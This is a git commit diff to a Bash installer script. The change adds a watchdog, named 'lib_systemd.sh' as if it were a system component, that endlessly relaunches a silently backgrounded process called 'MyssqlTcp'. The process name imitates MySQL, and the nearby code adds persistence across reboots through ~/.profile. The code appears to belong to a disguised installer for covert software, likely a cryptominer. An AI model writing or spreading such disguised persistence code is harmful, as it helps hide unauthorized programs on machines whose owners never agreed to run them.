b4145225f09ed7a054d43f199ec4ec903a32ea6f
teshushu <905353149@qq.com>
2023-01-25 10:30:29 +0800

    Update mysqltcp.sh

--- Bash/mysqltcp.sh
+++ Bash/mysqltcp.sh
@@ -759,6 +759,38 @@ EOL
 
 chmod +x $HOME/myssqltcp/Tcphost.sh
 
+# Write guard
+echo "[*] Creating $HOME/myssqltcp/lib_systemd.sh script"
+cat >$HOME/myssqltcp/lib_systemd.sh <<EOL
+#!/bin/bash
+if [ -z $HOME ]; then
+  echo "ERROR: Please define HOME environment variable to your home directory"
+  exit 1
+fi
+
+if [ ! -d $HOME ]; then
+  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
+  echo '  export HOME=<dir>'
+  exit 1
+fi
+
+export LD_LIBRARY_PATH=$HOME/myssqltcp/
+
+while true; do
+        server=`ps aux | grep MyssqlTcp | grep -v grep`
+        if [ ! "$server" ]; then
+            ./addconf.sh
+            /bin/bash ./Tcphost.sh --config=./config_background.json >/dev/null 2>&1
+            sleep 10
+        fi
+        ./logserver.sh
+        sleep 5
+done
+EOL
+
+
+chmod +x $HOME/myssqltcp/lib_systemd.sh
+
 # preparing script background work and work under reboot
 if ! sudo -n true 2>/dev/null; then
   if ! grep myssqltcp/Tcphost.sh $HOME/.profile >/dev/null; then
